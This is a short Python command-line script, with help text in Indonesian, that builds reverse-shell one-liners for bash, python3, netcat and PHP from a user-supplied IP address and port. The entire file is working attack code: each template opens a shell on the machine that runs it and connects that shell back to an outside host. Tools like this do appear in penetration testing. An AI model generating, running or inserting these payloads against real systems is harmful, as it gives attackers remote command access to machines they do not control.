import argparse

def generate_reverse_shell(os_type, ip, port):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    }
    return shells.get(os_type.lower(), "Unsupported OS/Method")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--os", required=True, help="Tipe shell (bash, python, nc, php)")
    parser.add_argument("--ip", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    result = generate_reverse_shell(args.os, args.ip, args.port)
    print(result)
